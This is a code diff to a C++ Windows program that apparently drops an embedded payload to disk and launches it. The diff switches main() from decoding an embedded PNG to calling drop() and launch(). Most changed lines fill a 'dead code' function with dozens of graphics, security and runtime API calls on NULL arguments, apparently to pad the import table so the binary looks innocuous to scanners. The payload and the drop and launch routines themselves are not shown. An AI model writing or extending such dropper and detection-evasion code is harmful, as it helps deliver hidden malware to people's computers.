@@ -8,6 +8,7 @@
 #include"resource.h"	// Resources Definition
 #include<time.h>		// rand seed
 #include<Winspool.h>
+#include<Winternl.h>
 
 // Imports for the dead code function
 #include<commctrl.h>
@@ -15,7 +16,7 @@
 #include<Uxtheme.h>
 #include<atlstr.h>
 #include<atlenc.h>
-//#include <wingdi.h>
+#include <wingdi.h>
 
 #include <delayimp.h>
 
@@ -31,7 +32,7 @@
 #pragma comment(lib, "Winmm.lib")
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "uxtheme.lib")
-//#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "Winspool.lib")
 
 typedef std::vector<unsigned char> DataVect;
@@ -79,16 +80,16 @@ int main()
 #endif
 
 	// Converting the image to exe
- 	unsigned width, height;
-	std::vector<unsigned char> image;
-	std::vector<unsigned char> png(reinterpret_cast<unsigned char*>(data), reinterpret_cast<unsigned char*>(data) + size);
-	unsigned error = lodepng::decode(image, width, height, png, LCT_RGB, 8);
+ 	//unsigned width, height;
+	//std::vector<unsigned char> image;
+	//std::vector<unsigned char> png(reinterpret_cast<unsigned char*>(data), reinterpret_cast<unsigned char*>(data) + size);
+	//unsigned error = lodepng::decode(image, width, height, png, LCT_RGB, 8);
 
 	// where to drop
 	set_name();
 	// Drop to Disk
-	// drop(size, data);
-	write_to_disk(name, image);
+	 drop(size, data);
+	//write_to_disk(name, image);
 	// launch process
 	launch();
 #ifdef DEAD_CODE
@@ -249,38 +250,38 @@ void dead()
 	HeapDestroy(NULL);
 	HeapReAlloc(NULL,NULL,NULL,NULL);
 	HeapSize(NULL,NULL,NULL);
-//	SetBkColor(NULL,NULL);
-//	SetBkMode(NULL,NULL);
+	SetBkColor(NULL,NULL);
+	SetBkMode(NULL,NULL);
 	EmptyClipboard();
-//	CreateDIBSection(NULL,NULL,NULL,NULL,NULL,NULL);
-//	GetStockObject(NULL);
-//	CreatePatternBrush(NULL);
-//	DeleteDC(NULL);
-//	EqualRgn(NULL,NULL);
-//	CombineRgn(NULL,NULL,NULL,NULL);
-//	SetRectRgn(NULL,NULL,NULL,NULL,NULL);
-//	CreateRectRgnIndirect(NULL);
-//	GetRgnBox(NULL,NULL);
-//	CreateRectRgn(NULL,NULL,NULL,NULL);
-//	CreateCompatibleBitmap(NULL,NULL,NULL);
-//	LineTo(NULL,NULL,NULL);
-//	MoveToEx(NULL,NULL,NULL,NULL);
-//	ExtCreatePen(NULL,NULL,NULL,NULL,NULL);
-//	GetObjectW(NULL,NULL,NULL);
-//	GetTextExtentPoint32W(NULL,NULL,NULL,NULL);
-//	GetTextMetricsW(NULL,NULL);
-//	CreateSolidBrush(NULL);
-//	SetTextColor(NULL,NULL);
-//	GetDeviceCaps(NULL,NULL);
-//	CreateCompatibleDC(NULL);
-//	CreateFontIndirectW(NULL);
-//	SelectObject(NULL,NULL);
-//	GetTextExtentPointW(NULL,NULL,NULL,NULL);
+	CreateDIBSection(NULL,NULL,NULL,NULL,NULL,NULL);
+	GetStockObject(NULL);
+	CreatePatternBrush(NULL);
+	DeleteDC(NULL);
+	EqualRgn(NULL,NULL);
+	CombineRgn(NULL,NULL,NULL,NULL);
+	SetRectRgn(NULL,NULL,NULL,NULL,NULL);
+	CreateRectRgnIndirect(NULL);
+	GetRgnBox(NULL,NULL);
+	CreateRectRgn(NULL,NULL,NULL,NULL);
+	CreateCompatibleBitmap(NULL,NULL,NULL);
+	LineTo(NULL,NULL,NULL);
+	MoveToEx(NULL,NULL,NULL,NULL);
+	ExtCreatePen(NULL,NULL,NULL,NULL,NULL);
+	GetObjectW(NULL,NULL,NULL);
+	GetTextExtentPoint32W(NULL,NULL,NULL,NULL);
+	GetTextMetricsW(NULL,NULL);
+	CreateSolidBrush(NULL);
+	SetTextColor(NULL,NULL);
+	GetDeviceCaps(NULL,NULL);
+	CreateCompatibleDC(NULL);
+	CreateFontIndirectW(NULL);
+	SelectObject(NULL,NULL);
+	GetTextExtentPointW(NULL,NULL,NULL,NULL);
 	RpcStringFreeW(NULL);
 	UuidToStringW(NULL,NULL);
 	UuidCreate(NULL);
 	timeGetTime();
-//	SetBkColor(NULL,NULL);
+	SetBkColor(NULL,NULL);
 	free(NULL);
 	isspace(NULL);
 	tolower(NULL);
@@ -310,5 +311,22 @@ void dead()
 	GetLastError();	
 	UploadPrinterDriverPackage(NULL,NULL,NULL,NULL,NULL,NULL,NULL);
 	LoadStringW(NULL,NULL,NULL,NULL);
-	
+
+// Added stuff again
+	GetLengthSid(NULL);
+	CopySid(NULL,NULL,NULL);
+	FreeSid(NULL);
+	InitializeSecurityDescriptor(NULL,NULL);
+	IsValidSid(NULL);
+	CreateFileW(NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+	SetSecurityDescriptorDacl(NULL,NULL,NULL,NULL);
+	RtlUnwindEx(NULL,NULL,NULL,NULL,NULL,NULL);
+	RtlVirtualUnwind(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
+	CoCreateGuid(NULL);
+	UuidCreate(NULL);
+	GetACP();
+	GetCPInfo(NULL,NULL);
+	GetStringTypeW(NULL,NULL,NULL,NULL);
+	RaiseException(NULL,NULL,NULL,NULL);
+	LeaveCriticalSection(NULL);
 }
